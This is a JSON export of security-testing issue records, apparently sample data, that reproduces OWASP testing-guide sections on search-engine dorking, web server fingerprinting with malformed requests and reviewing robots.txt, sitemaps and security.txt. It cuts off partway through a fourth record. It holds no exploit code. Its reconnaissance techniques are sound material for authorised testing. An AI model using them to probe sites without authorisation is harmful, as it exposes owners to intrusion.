[{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INFO-01 Conduct Search Engine Discovery Reconnaissance for Information Leakage","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":"Conduct Search Engine Discovery Reconnaissance for Information Leakage","Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Summary\nIn order for search engines to work, computer programs (or robots) regularly fetch data (referred to as [crawling](https://en.wikipedia.org/wiki/Web_crawler)) from billions of pages on the web. These programs find web content and functionality by following links from other pages, or by looking at sitemaps. If a site uses a special file called robots.txt to list pages that it does not want search engines to fetch, then the pages listed there will be ignored. This is a basic overview - Google offers a more in-depth explanation of [how a search engine works.](https://support.google.com/webmasters/answer/70897?hl=en)\nTesters can use search engines to perform reconnaissance on sites and web applications. There are direct and indirect elements to search engine discovery and reconnaissance: direct methods relate to searching the indexes and the associated content from caches, while indirect methods relate to learning sensitive design and configuration information by searching forums, newsgroups, and tendering sites.\nOnce a search engine robot has completed crawling, it commences indexing the web content based on tags and associated attributes, such as \u003CTITLE\u003E, in order to return relevant search results. If the robots.txt file is not updated during the lifetime of the site, and in-line HTML meta tags that instruct robots not to index content have not been used, then it is possible for indexes to contain web content not intended to be included by the owners. Site owners may use the previously mentioned robots.txt, HTML meta tags, authentication, and tools provided by search engines to remove such content.","TestingInstructions":"**Test Objectives**\nIdentify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization\u0027s site) or indirectly (via third-party services).\n**How to Test**\nUse a search engine to search for potentially sensitive information. This may include:\n\n* network diagrams and configurations;\n* archived posts and emails by administrators or other key staff;\n* logon procedures and username formats;\n* usernames, passwords, and private keys;\n* third-party, or cloud service configuration files;\n* revealing error message content; and\n* non-public applications (development, test, User Acceptance Testing (UAT), and staging versions of sites).\n\n**Search Engines**\nDo not limit testing to just one search engine provider, as different search engines may generate different results. Search engine results can vary in a few ways, depending on when the engine last crawled content, and the algorithm the engine uses to determine relevant pages. Consider using the following (alphabetically listed) search engines:\n\n* [Baidu](https://www.baidu.com/), China\u0027s [most popular](https://en.wikipedia.org/wiki/Web_search_engine#Market_share) search engine.\n* [Bing](https://www.bing.com/), a search engine owned and operated by Microsoft, and the second most popular worldwide. Supports advanced search keywords.\n* [binsearch.info](https://binsearch.info/), a search engine for binary Usenet newsgroups.\n* [Common Crawl](https://commoncrawl.org/), \u0022an open repository of web crawl data that can be accessed and analyzed by anyone.\u0022\n* [DuckDuckGo](https://duckduckgo.com/), a privacy-focused search engine that compiles results from many different sources. Supports search syntax.\n* [Google](https://www.google.com/), which offers the world\u0027s most popular search engine, and uses a ranking system to attempt to return the most relevant results. Supports [search operators.](https://support.google.com/websearch/answer/2466433)\n* [Internet Archive Wayback Machine](https://archive.org/web/), \u0022building a digital library of internet sites and other cultural artifacts in digital form.\u0022\n* [Shodan](https://www.shodan.io/), a service for searching internet-connected devices and services. Usage options include a limited free plan as well as paid subscription plans.\n    \n    **Search Operators**\n\nA search operator is a special keyword or syntax that extends the capabilities of regular search queries, and can help obtain more specific results. They generally take the form of operator:query. Here are some commonly supported search operators:\n\n* site: will limit the search to the provided domain.\n* inurl: will only return results that include the keyword in the URL.\n* intitle: will only return results that have the keyword in the page title.\n* intext: or inbody: will only search for the keyword in the body of pages.\n* filetype: will match only a specific file type, i.e. .png, or .php.\n\nFor example, to find the web content of owasp.org as indexed by a typical search engine, the syntax required is:\nsite:owasp.org\n![image.png](Image Not Found)\nGoogle Site Operation Search Result Example\nFigure 4.1.1-1: Google Site Operation Search Result Example\n\n**Viewing Cached Content**\nTo search for content that has previously been indexed, use the cache: operator. This is helpful for viewing content that may have changed since the time it was indexed, or that may no longer be available. Not all search engines provide cached content to search; the most useful source at time of writing is Google.\nTo view owasp.org as it is cached, the syntax is:\ncache:owasp.org\n\nGoogle Cache Operation Search Result Example\nFigure 4.1.1-2: Google Cache Operation Search Result Example\n\n![image.png](Image Not Found)**Google Hacking or Dorking**\nSearching with operators can be a very effective discovery technique when combined with the creativity of the tester. Operators can be chained to effectively discover specific kinds of sensitive files and information. This technique, called [Google hacking](https://en.wikipedia.org/wiki/Google_hacking) or Dorking, is also possible using other search engines, as long as the search operators are supported.\nA database of dorks, like the [Google Hacking Database,](https://www.exploit-db.com/google-hacking-database) is a useful resource that can help uncover specific information. Some categories of dorks available on this database include:\n\n* Footholds\n* Files containing usernames\n* Sensitive Directories\n* Web Server Detection\n* Vulnerable Files\n* Vulnerable Servers\n* Error Messages\n* Files containing juicy info\n* Files containing passwords\n* Sensitive Online Shopping Info","Details":null,"Implication":null,"Recommendation":"Carefully consider the sensitivity of design and configuration information before it is posted online.\nPeriodically review the sensitivity of existing design and configuration information that is posted online.","References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"01-Information Gathering","Description":"01-Information Gathering","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"be1d5a82-3e46-4f01-9b67-4f016b156e85","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INFO-02 Fingerprint Web Server","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":"Fingerprint Web Server","Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"**Test Objectives**\nDetermine the version and type of a running web server to enable further discovery of any known vulnerabilities.","TestingInstructions":"\\#\\# How to Test\nTechniques used for web server fingerprinting include \\[banner grabbing\\]\\(https://en\\.wikipedia\\.org/wiki/Banner\\_grabbing\\)\\, eliciting responses to malformed requests\\, and using automated tools to perform more robust scans that use a combination of tactics\\. The fundamental premise on which all these techniques operate is the same\\. They all strive to elicit some response from the web server which can then be compared to a database of known responses and behaviors\\, and thus matched to a known server type\\.\n\\#\\#\\# Banner Grabbing\nA banner grab is performed by sending an HTTP request to the web server and examining its \\[response header\\]\\(https://developer\\.mozilla\\.org/en\\-US/docs/Glossary/Response\\_header\\)\\. This can be accomplished using a variety of tools\\, including \\\u0060telnet\\\u0060 for HTTP requests\\, or \\\u0060openssl\\\u0060 for requests over TLS/SSL\\.\nFor example, here is the response to a request sent to an Apache server.\n\\\u0060\\\u0060\\\u0060\nHTTP/1.1 200 OK\nDate: Thu, 05 Sep 2019 17:42:39 GMT\nServer: Apache/2.4.41 (Unix)\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nETag: \u002275-591d1d21b6167\u0022\nAccept-Ranges: bytes\nContent-Length: 117\nConnection: close\nContent-Type: text/html\n...\n\\\u0060\\\u0060\\\u0060\nHere is another response, this time sent by nginx.\n\\\u0060\\\u0060\\\u0060\nHTTP/1.1 200 OK\nServer: nginx/1.17.3\nDate: Thu, 05 Sep 2019 17:50:24 GMT\nContent-Type: text/html\nContent-Length: 117\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nConnection: close\nETag: \u00225d71489a-75\u0022\nAccept-Ranges: bytes\n...\n\\\u0060\\\u0060\\\u0060\nHere\u2019s what a response sent by lighttpd looks like.\n\\\u0060\\\u0060\\\u0060\nHTTP/1.0 200 OK\nContent-Type: text/html\nAccept-Ranges: bytes\nETag: \u00224192788355\u0022\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nContent-Length: 117\nConnection: close\nDate: Thu, 05 Sep 2019 17:57:57 GMT\nServer: lighttpd/1.4.54\n\\\u0060\\\u0060\\\u0060\nIn these examples, the server type and version is clearly exposed. However, security-conscious applications may obfuscate their server information by modifying the header. For example, here is an excerpt from the response to a request for a site with a modified header:\n\\\u0060\\\u0060\\\u0060\nHTTP/1.1 200 OK\nServer: Website.com\nDate: Thu, 05 Sep 2019 17:57:06 GMT\nContent-Type: text/html; charset=utf-8\nStatus: 200 OK\n...\n\\\u0060\\\u0060\\\u0060\nIn cases where the server information is obscured, testers may guess the type of server based on the ordering of the header fields. Note that in the Apache example above, the fields follow this order:\n\\* Date\n\\* Server\n\\* Last-Modified\n\\* ETag\n\\* Accept-Ranges\n\\* Content-Length\n\\* Connection\n\\* Content-Type\nHowever, in both the nginx and obscured server examples, the fields in common follow this order:\n\\* Server\n\\* Date\n\\* Content-Type\nTesters can use this information to guess that the obscured server is nginx. However, considering that a number of different web servers may share the same field ordering and fields can be modified or removed, this method is not definite.\n\\#\\#\\# Sending Malformed Requests\nWeb servers may be identified by examining their error responses, and in the cases where they have not been customized, their default error pages. One way to compel a server to present these is by sending intentionally incorrect or malformed requests.\nFor example, here is the response to a request for the non-existent method \\\u0060SANTA CLAUS\\\u0060 from an Apache server.\n\\\u0060\\\u0060\\\u0060\nGET / SANTA CLAUS/1.1\nHTTP/1.1 400 Bad Request\nDate: Fri, 06 Sep 2019 19:21:01 GMT\nServer: Apache/2.4.41 (Unix)\nContent-Length: 226\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\u003C!DOCTYPE HTML PUBLIC \u0022-//IETF//DTD HTML 2.0//EN\u0022\u003E\n\\\u003Chtml\u003E\\\u003Chead\u003E\n\\\u003Ctitle\u003E400 Bad Request\\\u003C/title\u003E\n\\\u003C/head\u003E\\\u003Cbody\u003E\n\\\u003Ch1\u003EBad Request\\\u003C/h1\u003E\n\\\u003Cp\u003EYour browser sent a request that this server could not understand.\\\u003Cbr /\u003E\n\\\u003C/p\u003E\n\\\u003C/body\u003E\\\u003C/html\u003E\n\\\u0060\\\u0060\\\u0060\nHere is the response to the same request from nginx.\n\\\u0060\\\u0060\\\u0060\nGET / SANTA CLAUS/1.1\n\\\u003Chtml\u003E\n\\\u003Chead\u003E\\\u003Ctitle\u003E404 Not Found\\\u003C/title\u003E\\\u003C/head\u003E\n\\\u003Cbody\u003E\n\\\u003Ccenter\u003E\\\u003Ch1\u003E404 Not Found\\\u003C/h1\u003E\\\u003C/center\u003E\n\\\u003Chr\u003E\\\u003Ccenter\u003Enginx/1.17.3\\\u003C/center\u003E\n\\\u003C/body\u003E\n\\\u003C/html\u003E\n\\\u0060\\\u0060\\\u0060\nHere is the response to the same request from lighttpd.\n\\\u0060\\\u0060\\\u0060\nGET / SANTA CLAUS/1.1\nHTTP/1.0 400 Bad Request\nContent-Type: text/html\nContent-Length: 345\nConnection: close\nDate: Sun, 08 Sep 2019 21:56:17 GMT\nServer: lighttpd/1.4.54\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022iso-8859-1\u0022?\u003E\n\u003C!DOCTYPE html PUBLIC \u0022-//W3C//DTD XHTML 1.0 Transitional//EN\u0022\n \u0022http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\u0022\u003E\n\\\u003Chtml xmlns=\u0022http://www.w3.org/1999/xhtml\u0022 xml:lang=\u0022en\u0022 lang=\u0022en\u0022\u003E\n \\\u003Chead\u003E\n \\\u003Ctitle\u003E400 Bad Request\\\u003C/title\u003E\n \\\u003C/head\u003E\n \\\u003Cbody\u003E\n \\\u003Ch1\u003E400 Bad Request\\\u003C/h1\u003E\n \\\u003C/body\u003E\n\\\u003C/html\u003E\n\\\u0060\\\u0060\\\u0060\nAs default error pages offer many differentiating factors between types of web servers, their examination can be an effective method for fingerprinting even when server header fields are obscured.\n\\#\\#\\# Using Automated Scanning Tools\nAs stated earlier, web server fingerprinting is often included as a functionality of automated scanning tools. These tools are able to make requests similar to those demonstrated above, as well as send other more server-specific probes. Automated tools can compare responses from web servers much faster than manual testing, and utilize large databases of known responses to attempt server identification. For these reasons, automated tools are more likely to produce accurate results.\nHere are some commonly-used scan tools that include web server fingerprinting functionality.\n\\* \\[Netcraft\\]\\(https://toolbar\\.netcraft\\.com/site\\_report\\)\\, an online tool that scans sites for information\\, including web server details\\.\n\\* \\[Nikto\\]\\(https://github\\.com/sullo/nikto\\)\\, an Open Source command\\-line scanning tool\\.\n\\* \\[Nmap\\]\\(https://nmap\\.org/\\)\\, an Open Source command\\-line tool that also has a GUI\\, \\[Zenmap\\]\\(https://nmap\\.org/zenmap/\\)\\.","Details":null,"Implication":null,"Recommendation":"Remediation\nWhile exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\n* Obscuring web server information in headers, such as with Apache\u2019s mod_headers module.\n* Using a hardened reverse proxy server to create an additional layer of security between the web server and the internet.\n* Ensuring that web servers are kept up-to-date with the latest software and security patches.","References":null,"Reference":null,"Vendor":"OWASP","Product":"Pentest","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundamentals of how these tools attempt to identify software, and why this is useful.\nAccurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"01-Information Gathering","Description":"01-Information Gathering","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"be1d5a82-3e46-4f01-9b67-4f016b156e85","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INFO-03 Review Webserver Metafiles for Information Leakage","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":"Review Webserver Metafiles for Information Leakage","Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThis section describes how to test various metadata files for information leakage of the web application\u2019s path(s), or functionality. Furthermore, the list of directories that are to be avoided by Spiders, Robots, or Crawlers can also be created as a dependency for [Map execution paths through application](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application). Other information may also be collected to identify attack surface, technology details, or for use in social engineering engagement.","TestingInstructions":"## Test Objectives\n\n* Identify hidden or obfuscated paths and functionality through the analysis of metadata files.\n* Extract and map other information that could lead to a better understanding of the systems at hand.\n\n## How to Test\n\n\u003E Any of the actions performed below with \u0060wget\u0060 could also be done with \u0060curl\u0060. Many Dynamic Application Security Testing (DAST) tools such as ZAP and Burp Suite include checks or parsing for these resources as part of their spider/crawler functionality. They can also be identified using various [Google Dorks](https://en.wikipedia.org/wiki/Google_hacking) or leveraging advanced search features such as \u0060inurl:\u0060.\n\n### Robots\n\nWeb Spiders, Robots, or Crawlers retrieve a web page and then recursively traverse hyperlinks to retrieve further web content. Their accepted behavior is specified by the [Robots Exclusion Protocol](https://www.robotstxt.org/) of the [robots.txt](https://www.robotstxt.org/) file in the web root directory.\nAs an example, the beginning of the \u0060robots.txt\u0060 file from [Google](https://www.google.com/robots.txt) sampled on 2020 May 5 is quoted below:\n\n\u0060\u0060\u0060\nUser-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\nDisallow: /sdch\n...\n\u0060\u0060\u0060\n\nThe [User-Agent](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent) directive refers to the specific web spider/robot/crawler. For example, the \u0060User-Agent: Googlebot\u0060 refers to the spider from Google while \u0060User-Agent: bingbot\u0060 refers to a crawler from Microsoft. \u0060User-Agent: *\u0060 in the example above applies to all [web spiders/robots/crawlers](https://support.google.com/webmasters/answer/6062608?visit_id=637173940975499736-3548411022\u0026rd=1).\nThe \u0060Disallow\u0060 directive specifies which resources are prohibited by spiders/robots/crawlers. In the example above, the following are prohibited:\n\n\u0060\u0060\u0060\n...\nDisallow: /search\n...\nDisallow: /sdch\n...\n\u0060\u0060\u0060\n\nWeb spiders/robots/crawlers can [intentionally ignore](https://blog.isc2.org/isc2_blog/2008/07/the-attack-of-t.html) the \u0060Disallow\u0060 directives specified in a \u0060robots.txt\u0060 file. Hence, \u0060robots.txt\u0060 should not be considered as a mechanism to enforce restrictions on how web content is accessed, stored, or republished by third parties.\nThe \u0060robots.txt\u0060 file is retrieved from the web root directory of the web server. For example, to retrieve the \u0060robots.txt\u0060 from \u0060www.google.com\u0060 using \u0060wget\u0060 or \u0060curl\u0060:\n\n\u0060\u0060\u0060\n$ curl -O -Ss http://www.google.com/robots.txt \u0026\u0026 head -n5 robots.txt\nUser-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\n...\n\u0060\u0060\u0060\n\n#### Analyze robots.txt Using Google Webmaster Tools\n\nSite owners can use the Google \u201CAnalyze robots.txt\u201D function to analyze the site as part of its [Google Webmaster Tools](https://www.google.com/webmasters/tools). This tool can assist with testing and the procedure is as follows:\n\n1. Sign into Google Webmaster Tools with a Google account.\n2. On the dashboard, enter the URL for the site to be analyzed.\n3. Choose between the available methods and follow the on screen instruction.\n\n### META Tags\n\n\u0060\u003CMETA\u003E\u0060 tags are located within the \u0060HEAD\u0060 section of each HTML document and should be consistent across a site in the event that the robot/spider/crawler start point does not begin from a document link other than webroot i.e. a [deep link](https://en.wikipedia.org/wiki/Deep_linking). The Robots directive can also be specified using a specific [META tag](https://www.robotstxt.org/meta.html).\n\n#### Robots META Tag\n\nIf there is no \u0060\u003CMETA NAME=\u0022ROBOTS\u0022 ... \u003E\u0060 entry, then the \u201CRobots Exclusion Protocol\u201D defaults to \u0060INDEX,FOLLOW\u0060 respectively. Therefore, the other two valid entries defined by the \u201CRobots Exclusion Protocol\u201D are prefixed with \u0060NO...\u0060 i.e. \u0060NOINDEX\u0060 and \u0060NOFOLLOW\u0060.\nBased on the Disallow directive(s) listed within the \u0060robots.txt\u0060 file in webroot, a regular expression search for \u0060\u003CMETA NAME=\u0022ROBOTS\u0022\u0060 is undertaken within each web page. The result is then compared to the robots.txt file in the webroot.\n\n#### Miscellaneous META Information Tags\n\nOrganizations often embed informational META tags in web content to support various technologies such as screen readers, social networking previews, search engine indexing, etc. Such meta-information can be of value to testers in identifying technologies used, and additional paths/functionality to explore and test. The following meta information was retrieved from \u0060www.whitehouse.gov\u0060 via View Page Source on 2020 May 05:\n\n\u0060\u0060\u0060\n...\n\u003Cmeta property=\u0022og:locale\u0022 content=\u0022en_US\u0022 /\u003E\n\u003Cmeta property=\u0022og:type\u0022 content=\u0022website\u0022 /\u003E\n\u003Cmeta property=\u0022og:title\u0022 content=\u0022The White House\u0022 /\u003E\n\u003Cmeta property=\u0022og:description\u0022 content=\u0022We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. \u2013 President Donald Trump.\u0022 /\u003E\n\u003Cmeta property=\u0022og:url\u0022 content=\u0022https://www.whitehouse.gov/\u0022 /\u003E\n\u003Cmeta property=\u0022og:site_name\u0022 content=\u0022The White House\u0022 /\u003E\n\u003Cmeta property=\u0022fb:app_id\u0022 content=\u00221790466490985150\u0022 /\u003E\n\u003Cmeta property=\u0022og:image\u0022 content=\u0022https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\u0022 /\u003E\n\u003Cmeta property=\u0022og:image:secure_url\u0022 content=\u0022https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\u0022 /\u003E\n\u003Cmeta name=\u0022twitter:card\u0022 content=\u0022summary_large_image\u0022 /\u003E\n\u003Cmeta name=\u0022twitter:description\u0022 content=\u0022We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. \u2013 President Donald Trump.\u0022 /\u003E\n\u003Cmeta name=\u0022twitter:title\u0022 content=\u0022The White House\u0022 /\u003E\n\u003Cmeta name=\u0022twitter:site\u0022 content=\u0022@whitehouse\u0022 /\u003E\n\u003Cmeta name=\u0022twitter:image\u0022 content=\u0022https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\u0022 /\u003E\n\u003Cmeta name=\u0022twitter:creator\u0022 content=\u0022@whitehouse\u0022 /\u003E\n...\n\u003Cmeta name=\u0022apple-mobile-web-app-title\u0022 content=\u0022The White House\u0022\u003E\n\u003Cmeta name=\u0022application-name\u0022 content=\u0022The White House\u0022\u003E\n\u003Cmeta name=\u0022msapplication-TileColor\u0022 content=\u0022#0c2644\u0022\u003E\n\u003Cmeta name=\u0022theme-color\u0022 content=\u0022#f5f5f5\u0022\u003E\n...\n\u0060\u0060\u0060\n\n### Sitemaps\n\nA sitemap is a file where a developer or organization can provide information about the pages, videos, and other files offered by the site or application, and the relationship between them. Search engines can use this file to navigate your site more efficiently. Likewise, testers can utilize \u2018sitemap.xml\u2019 files to gain deeper insights into the site or application under investigation.\nThe following excerpt is from Google\u2019s primary sitemap retrieved 2020 May 05.\n\n\u0060\u0060\u0060\n$ wget --no-verbose https://www.google.com/sitemap.xml \u0026\u0026 head -n8 sitemap.xml\n2020-05-05 12:23:30 URL:https://www.google.com/sitemap.xml [2049] -\u003E \u0022sitemap.xml\u0022 [1]\n\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022UTF-8\u0022?\u003E\n\u003Csitemapindex xmlns=\u0022http://www.google.com/schemas/sitemap/0.84\u0022\u003E\n  \u003Csitemap\u003E\n    \u003Cloc\u003Ehttps://www.google.com/gmail/sitemap.xml\u003C/loc\u003E\n  \u003C/sitemap\u003E\n  \u003Csitemap\u003E\n    \u003Cloc\u003Ehttps://www.google.com/forms/sitemaps.xml\u003C/loc\u003E\n  \u003C/sitemap\u003E\n...\n\u0060\u0060\u0060\n\nExploring from there a tester may wish to retrieve the gmail sitemap \u0060https://www.google.com/gmail/sitemap.xml\u0060:\n\n\u0060\u0060\u0060\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022UTF-8\u0022?\u003E\n\u003Curlset xmlns=\u0022http://www.sitemaps.org/schemas/sitemap/0.9\u0022 xmlns:xhtml=\u0022http://www.w3.org/1999/xhtml\u0022\u003E\n  \u003Curl\u003E\n    \u003Cloc\u003Ehttps://www.google.com/intl/am/gmail/about/\u003C/loc\u003E\n    \u003Cxhtml:link href=\u0022https://www.google.com/gmail/about/\u0022 hreflang=\u0022x-default\u0022 rel=\u0022alternate\u0022/\u003E\n    \u003Cxhtml:link href=\u0022https://www.google.com/intl/el/gmail/about/\u0022 hreflang=\u0022el\u0022 rel=\u0022alternate\u0022/\u003E\n    \u003Cxhtml:link href=\u0022https://www.google.com/intl/it/gmail/about/\u0022 hreflang=\u0022it\u0022 rel=\u0022alternate\u0022/\u003E\n    \u003Cxhtml:link href=\u0022https://www.google.com/intl/ar/gmail/about/\u0022 hreflang=\u0022ar\u0022 rel=\u0022alternate\u0022/\u003E\n...\n\u0060\u0060\u0060\n\n### Security TXT\n\n[security.txt](https://securitytxt.org/) was ratified by the IETF as [RFC 9116 - A File Format to Aid in Security Vulnerability Disclosure](https://www.rfc-editor.org/rfc/rfc9116.html) which allows sites to define security policies and contact details. There are multiple reasons why this might be of interest in testing scenarios, which include, but are not limited to:\n\n* Identifying further paths or resources to include in discovery/analysis.\n* Open Source intelligence gathering.\n* Finding information on Bug Bounties, etc.\n* Social Engineering.\n\nThe file may be present either in the root of the webserver or in the \u0060.well-known/\u0060 directory, for example:\n\n* \u0060https://example.com/security.txt\u0060\n* \u0060https://example.com/.well-known/security.txt\u0060\n\nHere is a real world example retrieved from LinkedIn 2020 May 05:\n\n\u0060\u0060\u0060\n$ wget --no-verbose https://www.linkedin.com/.well-known/security.txt \u0026\u0026 cat security.txt\n2020-05-07 12:56:51 URL:https://www.linkedin.com/.well-known/security.txt [333/333] -\u003E \u0022security.txt\u0022 [1]\n# Conforms to IETF \u0060draft-foudil-securitytxt-07\u0060\nContact: mailto:security@linkedin.com\nContact: https://www.linkedin.com/help/linkedin/answer/62924\nEncryption: https://www.linkedin.com/help/linkedin/answer/79676\nCanonical: https://www.linkedin.com/.well-known/security.txt\nPolicy: https://www.linkedin.com/help/linkedin/answer/62924\n\u0060\u0060\u0060\n\nOpenPGP Public Keys contain some metadata that can provide information about the key itself. Here are some common metadata elements that can be extracted from an OpenPGP Public Key:\n\n* **Key ID**: The Key ID is a short identifier derived from the public key material. It helps identify the key and is often displayed as an eight-character hexadecimal value.\n* **Key Fingerprint**: The Key Fingerprint is a longer and more unique identifier derived from the key material. It is often displayed as a 40-character hexadecimal value. Key fingerprints are commonly used to verify the integrity and authenticity of a public key.\n* **Key Algorithm**: The Key Algorithm represents the cryptographic algorithm used by the public key. OpenPGP supports various algorithms such as RSA, DSA, and ECC (Elliptic Curve Cryptography).\n* **Key Size**: The Key Size refers to the length or size of the cryptographic key in bits. It indicates the strength of the key and determines the level of security provided by the key.\n* **Key Creation Date**: The Key Creation Date indicates when the key was generated or created.\n* **Key Expiration Date**: OpenPGP Public Keys can have an expiration date set, after which they are considered invalid. The Key Expiration Date specifies when the key is no longer valid.\n* **User IDs**: Public keys can have one or more associated User IDs that identify the owner or entity associated with the key. User IDs typically include information such as the name, email address, and optional comments of the key owner.\n\n### Humans TXT\n\n\u0060humans.txt\u0060 is an initiative for knowing the people behind a site. It takes the form of a text file that contains information about the different people who have contributed to building the site. This file often (but not always) contains information related to career or job sites/paths.\nThe following example was retrieved from Google 2020 May 05:\n\n\u0060\u0060\u0060\n$ wget --no-verbose  https://www.google.com/humans.txt \u0026\u0026 cat humans.txt\n2020-05-07 12:57:52 URL:https://www.google.com/humans.txt [286/286] -\u003E \u0022humans.txt\u0022 [1]\nGoogle is built by a large team of engineers, designers, researchers, robots, and others in many different sites across the globe. It is updated continuously, and built with more tools and technologies than we can shake a stick at. If you\u0027d like to help us out, see careers.google.com.\n\u0060\u0060\u0060\n\n### Other .well-known Information Sources\n\nThere are other RFCs and internet drafts which suggest standardized uses of files within the \u0060.well-known/\u0060 directory. Lists of these can be found [here](https://en.wikipedia.org/wiki/List_of_/.well-known/_services_offered_by_webservers) or [here](https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml).\nIt would be fairly simple for a tester to review the RFC/drafts and create a list to be supplied to a crawler or fuzzer, in order to verify the existence or content of such files.\n\n## Tools\n\n* Browser (View Source or Dev Tools functionality)\n* curl\n* wget\n* Burp Suite\n* ZAP","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"01-Information Gathering","Description":"01-Information Gathering","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"be1d5a82-3e46-4f01-9b67-4f016b156e85","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INFO-04 Enumerate Applications on Webserver","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not 